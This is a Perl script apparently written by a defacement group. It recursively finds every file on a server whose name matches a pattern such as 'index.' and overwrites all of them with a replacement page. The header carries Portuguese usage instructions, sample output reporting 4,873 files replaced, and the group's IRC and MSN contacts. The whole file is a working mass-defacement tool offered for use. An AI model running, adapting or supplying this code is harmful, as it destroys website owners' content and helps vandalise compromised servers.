#!/usr/local/bin/perl
#-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-@
#												@
#	Usage:											@
#												@
#	[sap0@localhost tmp]$ perl ka0s_over -d /home/www/ -f index. -n /tmp/index.html		@
#												@
#	- = [ Ka0tic Lab Tool for Mass Defacement Version 0.3 by S4P0 ] = -			@
#	Contate nos:										@
#	             @MSN: sap0@linuxmail.org							@
#	             #IRC: irc.GigaChat.org - irc.EFnet.org - Canal #Ka0tic			@
#												@
#	=-=-=-=-=-=										@
#	Opcoes:											@
#	        -d = Diretorio dos Arquivos, Somente / N?o funciona!				@
#	        -f = Nome do arquivo a ser trocado						@
#	        -n = Diretorio do novo arquivo.							@
#	Exemplo:										@
#	perl ka0s_over.pl -d / -f index. -n /tmp/index.html					@
#	=-=-=-=-=-=										@
#												@
#	[+] Ok, Diretorio dos arquivos: /www/							@
#	[+] Ok, O arquivo a ser substituido: index.						@
#	[+] Ok, Novo arquivo a ser colocado: /tmp/index.html					@
#	[+] Buscando arquivo[s]									@
#	[+] Ok, Foram encontrados: 4873 arquivos...						@
#	[+] Substituindo os arquivos.								@
#	[+] Arquivos Substituidos com Sucesso!							@
#	[+] Total de Arquivos substituidos: 4873						@
################################################################################################@
# Detalhes:											@
################################################################################################@
# Vers?o 3 do ka0s_over:									@
# Retirada fun??es system(); e o comando find que da erro em Sistemas Operacionais,		@
# que n?o o Possuem. E colocado um programa em perl que procura e troca.			@
#												@
# PS:												@
# N?o se esque?a de colocar um diret?rio espec?ficado, s? / n?o funciona. Coloquei esse		@
# Detalhe at? por que se colocar / ele ir? fazer uma pesquisa muito grande e muito demorada,	@
# e poder? causar o travamento do sistema!! ai j? ?ra.						@
#-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-@

################################## ABOUT ###################################################
$VERSION="Version 0.3 by S4P0";
$about =
"\n- = [ Ka0tic Lab Tool for Mass Defacement $VERSION ] = -\n".
"Contate nos:\n".
"\t     \@MSN: sap0\@linuxmail.org\n".
"\t     \#IRC: irc.GigaChat.org - irc.EFnet.org - Canal \#Ka0tic\n".
"\n=-=-=-=-=-=".
"\nOpcoes:\n".
"\t-d = Diretorio dos arquivos, somente \"\/\" Nao funciona!\n".
"\t-f = Nome do arquivo a ser trocado\n".
"\t-n = Diretorio do novo arquivo.\n".
"Exemplo:\nperl ka0s_over.pl -d /www -f index. -n /tmp/index.html\n".
"=-=-=-=-=-=\n";
############################################################################################
use Getopt::Std;
getopts('d:f:n:', \%args);
if (defined($args{'d'})){$dir=$args{'d'};}else{$dir="/";}
if (defined($args{'f'})){$file=$args{'f'};}else{$dir="";}
if (defined($args{'n'})){$newfile=$args{'n'};}else{$newfile="";}

print $about;

$dirok="[+] Ok, Diretorio dos arquivos: $dir";
$fileok="[+] Ok, O arquivo a ser substituido: $file";
$newfileok="[+] Ok, Novo arquivo a ser colocado: $newfile";

if("$dir") {
 print "$dirok\n";
sleep(1);
}
if("$file") {
 print "$fileok\n";
sleep(1);
}
else
{
 print "";
exit();
}
if("$newfile") {
 print "$newfileok\n";
sleep(1);
}
else
{
 print "";
exit();
}

printf "[+] Buscando arquivo[s]\n";
my @troca;
find($dir, sub { push(@troca, $_[0]) if ($_[0] =~ /$file/i) });
my $quantidade = scalar(@troca);

if($quantidade<=0) {
print "[-] Erro: Nenhum Arquivo encontrado.\n";sleep(1);
print "[-] Coloque a extencao do arquivo.\n";sleep(1);
print "[-] Ou, Apenas arquivo. [Sem extencao].\n";sleep(1);
exit();
}

printf "[+] Ok, Foram encontrados: $quantidade arquivos...\n";sleep(1);
printf "[+] Substituindo os arquivos.\n";
open(NEW, "< $newfile");
foreach $files(@troca)
{
open(FILE, "> $files");
while (<NEW>) {
print FILE $_;
}
close(FILE);
seek(NEW, 0, 0);
}
close(NEW);
sleep(1);
printf "[+] Arquivos Substituidos com Sucesso!\n";sleep(1);
printf "[+] Total de Arquivos substituidos: $quantidade\n";
sub find {
  my ($path, $callback) = @_;
  $path = '/' unless $path;
  $path =~ s/^\/+/\//;
  $path =~ s/\/$//;
  my @files = list_dir($path);
  my @dirs;
  foreach my $file (@files) {
    my $filepath = $path.'/'.$file;
    &{$callback}($filepath);
    push(@dirs, $filepath) if (-d $filepath);
  }
  undef(@files);
  map { find($_, $callback) } @dirs;
  return(1);
}
sub list_dir {
   my ($dir, $dont_list_subdirs) = @_;
   opendir(DIR, $dir) || return();
   my @files = readdir(DIR);
   closedir(DIR);
   @files = grep { !-d "$dir/$_" } @files if ($dont_list_subdirs);
   my @files = grep { $_ !~ /^(\.){1,2}$/ } @files;
   return(@files);
}
